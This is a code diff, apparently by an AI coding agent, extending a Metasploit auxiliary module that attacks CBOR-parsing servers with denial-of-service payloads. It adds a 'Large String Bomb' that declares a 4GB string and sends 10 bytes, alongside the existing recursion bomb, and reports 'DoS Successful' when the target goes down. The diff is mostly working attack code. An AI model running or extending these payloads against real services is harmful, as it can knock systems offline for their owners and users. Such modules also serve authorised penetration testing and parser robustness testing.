@@ -16,6 +16,8 @@ class MetasploitModule < Msf::Auxiliary
            triggering OOM if the server pre-allocates memory.
         2. Recursion Bomb: Sends a deeply nested CBOR structure (array of arrays) to
            trigger a stack overflow.
+        3. Large String Bomb: Sends a CBOR string with a declared length of 4GB but
+           minimal data, testing memory allocation and length validation.
       },
       'Author'         => ['OpenCode'],
       'License'        => MSF_LICENSE
@@ -51,6 +53,15 @@ class MetasploitModule < Msf::Auxiliary
       print_good("Target survived Recursion Bomb.")
     else
       print_good("Target DOWN after Recursion Bomb! (DoS Successful)")
+      return
+    end
+
+    attack_large_string_bomb
+
+    if check_health
+      print_good("Target survived Large String Bomb.")
+    else
+      print_good("Target DOWN after Large String Bomb! (DoS Successful)")
     end
   end
 
@@ -83,6 +94,15 @@ class MetasploitModule < Msf::Auxiliary
     # Nested arrays: [ [ [ ... ] ] ]
     # 0x81 = Array(1)
     payload = ("\x81" * depth) + "\x01" # Innermost integer 1
+    
+    send_payload(payload)
+  end
+
+  def attack_large_string_bomb
+    print_status("Sending Large String Bomb (Declared: 4GB, Actual: 10 bytes)...")
+    # 0x7B = String(8-byte count)
+    # 0xFFFFFFFF = 4294967295 bytes
+    payload = "\x7B" + [0xFFFFFFFF].pack('Q>') + "A" * 10
     
     send_payload(payload)
   end
